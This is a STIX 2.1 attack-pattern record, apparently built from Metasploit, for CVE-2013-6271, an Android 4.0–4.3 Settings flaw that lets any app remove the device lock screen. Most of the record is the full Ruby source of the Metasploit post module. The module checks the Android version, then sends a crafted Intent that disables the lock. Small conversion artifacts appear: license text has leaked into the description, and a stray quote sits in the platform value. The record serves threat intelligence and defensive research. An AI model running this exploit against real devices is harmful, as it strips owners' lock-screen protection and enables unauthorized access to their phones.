{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cd4c5d8f-dafd-426e-b9d5-e7601f9a2ad6",
    "created": "2024-08-14T16:33:00.707122Z",
    "modified": "2024-08-14T16:33:00.707125Z",
    "name": "Android Settings Remove Device Locks (4.0-4.3)",
    "description": " This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class. Any unprivileged app can exploit this vulnerability to remove the lockscreen. A logic flaw / design error exists in the settings application that allows an Intent from any application to clear the screen lock. The user may see that the Settings application has crashed and the phone can then be unlocked by a swipe. This vulnerability was patched in Android 4.4.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/manage/remove_lock.rb",
            "external_id": "remove_lock.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6271"
        },
        {
            "source_name": "reference",
            "url": "http://blog.curesec.com/article/blog/26.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.curesec.com/data/advisories/Curesec-2013-1011.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  Rank = NormalRanking\n\n  include Msf::Post::Common\n  include Msf::Post::Android::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Android Settings Remove Device Locks (4.0-4.3)',\n          'Description' => %q{\n            This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class.\n            Any unprivileged app can exploit this vulnerability to remove the lockscreen.\n            A logic flaw / design error exists in the settings application that allows an Intent from any\n            application to clear the screen lock. The user may see that the Settings application has crashed,\n            and the phone can then be unlocked by a swipe.\n            This vulnerability was patched in Android 4.4.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'CureSec', # discovery\n            'timwr' # metasploit module\n          ],\n          'References' => [\n            [ 'CVE', '2013-6271' ],\n            [ 'URL', 'http://blog.curesec.com/article/blog/26.html' ],\n            [ 'URL', 'http://www.curesec.com/data/advisories/Curesec-2013-1011.pdf' ]\n          ],\n          'SessionTypes' => [ 'meterpreter', 'shell' ],\n          'Platform' => 'android',\n          'DisclosureDate' => '2013-10-11',\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                android_*\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def is_version_compat?\n    build_prop = get_build_prop\n\n    # Sometimes cmd_exec fails to cat build_prop, so the #get_build_prop method returns\n    # empty.\n    if build_prop.empty?\n      fail_with(Failure::Unknown, 'Failed to retrieve build.prop, you might need to try again.')\n    end\n\n    android_version = Rex::Version.new(build_prop['ro.build.version.release'])\n    if android_version <= Rex::Version.new('4.3') && android_version >= Rex::Version.new('4.0')\n      return true\n    end\n\n    false\n  end\n\n  def run\n    unless is_version_compat?\n      print_error('This module is only compatible with Android versions 4.0 to 4.3')\n      return\n    end\n\n    result = session.android.activity_start('intent:#Intent;launchFlags=0x8000;component=com.android.settings/.ChooseLockGeneric;i.lockscreen.password_type=0;B.confirm_credentials=false;end')\n    if result.nil?\n      print_good('Intent started, the lock screen should now be a dud.')\n      print_good('Go ahead and manually swipe or provide any pin/password/pattern to continue.')\n    else\n      print_error(\"The Intent could not be started: #{result}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-11",
    "x_mitre_platforms": [
        "android'"
    ]
}